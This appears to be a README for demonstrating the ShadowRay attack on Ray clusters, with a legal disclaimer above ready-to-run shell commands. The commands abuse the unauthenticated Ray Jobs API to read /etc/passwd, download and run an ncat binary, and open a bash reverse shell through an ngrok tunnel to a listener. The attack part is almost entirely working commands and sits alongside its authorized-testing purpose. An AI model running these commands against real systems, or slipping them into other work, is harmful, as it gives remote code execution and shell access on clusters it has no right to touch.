# Offensive Tools - ShadowRay Attack Chain

> **LEGAL DISCLAIMER**
>
> These tools and procedures are provided strictly for **authorized security
> testing, research, and educational purposes**. Use them only against systems
> you own or have explicit written permission to test.
>
> Unauthorized access to computer systems is a criminal offense under the
> Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent
> laws worldwide. The authors assume no liability for misuse.
>
> **Before running any commands below, ensure you have:**
> 1. Written authorization from the system owner
> 2. An isolated lab environment with no production data
> 3. Understanding of the legal implications in your 1jurisdiction

---

It can be showed using bash commands or alternatively the Python script.

# Basic discovery and reconnaissance 
nmap -p 8265 127.0.0.1
curl http://127.0.0.1:8265/api/version


## Direct exploit via Ray job submission
### Get /etc/passwd
# Get /etc/passwd
JOB=$(curl -s -X POST http://localhost:8265/api/jobs/ -H "Content-Type: application/json" -d '{"entrypoint": "cat /etc/passwd | head -5", "runtime_env": {}}' | jq -r '.submission_id') && sleep 5 && curl -s http://localhost:8265/api/jobs/${JOB}/logs | jq -r '.logs'
# Download netcat and scan a domain
# Test connection to external domain
JOB=$(curl -s -X POST http://localhost:8265/api/jobs/ \
  -H "Content-Type: application/json" \
  -d '{
    "entrypoint": "bash -c \"wget -O /tmp/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && chmod +x /tmp/ncat && echo Testing connection to google.com:443... && timeout 3 /tmp/ncat -v google.com 443 || echo Connection test complete\"",
    "runtime_env": {}
  }' | jq -r '.submission_id') && echo "Job: $JOB" && sleep 10 && curl -s http://localhost:8265/api/jobs/${JOB}/logs | jq -r '.logs'


######################
######################

# REVERSE SHELL

## Local Terminal 1 - Start the listener
nc -lvn 4444

## Local Terminal 2 - Start ngrok tunnel in the background and annotate the url, in this case we assume the output is tcp://3.tcp.eu.ngrok.io:11146 -> localhost:4444
ngrok tcp 4444 > /dev/null 2>&1 &
NGROK_PID=$!
echo "ngrok PID: $NGROK_PID"

# Wait for tunnel to be ready
ngrok tcp 4444 > /dev/null 2>&1 &
NGROK_PID=$!
echo "ngrok PID: $NGROK_PID"

echo "Waiting for ngrok tunnel..."
until curl -s http://127.0.0.1:4040/api/tunnels | jq -e '.tunnels[0].public_url' > /dev/null 2>&1; do
  sleep 1
done
sleep 1

# 3. Extract host and port
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
NGROK_HOST=$(echo $NGROK_URL | sed 's/tcp:\/\///' | cut -d: -f1)
NGROK_PORT=$(echo $NGROK_URL | sed 's/tcp:\/\///' | cut -d: -f2)
echo "Tunnel ready: $NGROK_HOST:$NGROK_PORT"

# 4. Launch reverse shell via Ray Jobs API (bash method - no dependencies)
JOB=$(curl -s -X POST http://localhost:8265/api/jobs/ \
  -H "Content-Type: application/json" \
  -d "{
    \"entrypoint\": \"bash -c \\\"bash -i >& /dev/tcp/$NGROK_HOST/$NGROK_PORT 0>&1\\\"\",
    \"runtime_env\": {}
  }" | jq -r '.submission_id') && echo "Job: $JOB"


## GET BACK TO THE Terminal 1 - Start operating with the reverse shell
ls 
...

## Local Terminal 2 - After finishing the demo, kill the ngrok tunnel
kill $NGROK_PID

